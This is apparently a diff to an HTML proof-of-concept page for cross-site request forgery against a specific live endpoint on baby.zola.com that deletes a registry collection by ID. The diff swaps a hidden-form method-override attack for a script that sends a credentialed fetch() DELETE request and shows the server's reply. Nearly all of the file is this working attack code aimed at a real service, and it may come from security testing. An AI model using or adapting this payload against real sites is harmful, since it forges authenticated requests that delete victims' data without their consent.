@@ -1,12 +1,28 @@
 <!doctype html>
 <html>
   <body>
-    <h3>CSRF method-override PoC</h3>
-    <form action="https://baby.zola.com/web-registry-api/v1/registryCollection/delete/68ccdeed2dbed25b3fc6b604" method="POST">
-      <!-- common override parameter name -->
-      <input type="hidden" name="_method" value="DELETE">
-      <input type="submit" value="Submit CSRF">
-    </form>
+    <h3>CSRF fetch() manual PoC</h3>
+    <p>Endpoint: <code>https://baby.zola.com/web-registry-api/v1/registryCollection/delete/68ccdeed2dbed25b3fc6b604</code></p>
+    <button id="sendBtn">Send DELETE</button>
+    <pre id="result" style="white-space:pre-wrap;border:1px solid #ccc;padding:8px;margin-top:12px;">Result will appear here</pre>
+
+    <script>
+      const btn = document.getElementById('sendBtn');
+      const out = document.getElementById('result');
+
+      btn.addEventListener('click', async () => {
+        out.textContent = 'Sending OPTIONS/DELETE... (check Network tab)';
+        try {
+          const res = await fetch('https://baby.zola.com/web-registry-api/v1/registryCollection/delete/68ccdeed2dbed25b3fc6b604', {
+            method: 'DELETE',
+            credentials: 'include'
+          });
+          const text = await res.text().catch(() => '[no body]');
+          out.textContent = 'HTTP ' + res.status + ' ' + res.statusText + '\\n\\n' + text;
+        } catch (err) {
+          out.textContent = 'Fetch error: ' + err;
+        }
+      });
+    </script>
   </body>
 </html>
-
